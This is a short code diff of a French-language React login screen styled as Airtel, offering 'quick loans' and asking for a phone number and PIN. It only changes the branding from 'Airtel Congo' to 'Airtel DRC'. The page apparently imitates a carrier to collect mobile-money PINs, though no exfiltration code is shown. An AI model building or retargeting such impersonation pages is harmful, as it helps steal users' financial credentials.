@@ -34,7 +34,7 @@ function AirtelLogin() {
     const pinString = pin.join('');
 
     if (phone.length < PHONE_MAX) {
-      setError('Entrez un numéro Airtel Congo valide.');
+      setError('Entrez un numéro Airtel DRC valide.');
       return;
     }
     if (pinString.length < 4) {
@@ -71,14 +71,14 @@ function AirtelLogin() {
             <line x1="3" y1="18" x2="21" y2="18" />
           </svg>
         </div>
-        <h1 className="airtel-logo">Airtel Congo</h1>
+        <h1 className="airtel-logo">Airtel DRC</h1>
         <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
       </div>
 
       {/* Main White Card */}
       <div className="airtel-card">
         <h2 className="airtel-welcome">Bon retour</h2>
-        <p className="airtel-subtext">Connectez-vous à votre compte Airtel Congo</p>
+        <p className="airtel-subtext">Connectez-vous à votre compte Airtel DRC</p>
 
         {error && (
           <div className="airtel-alert">
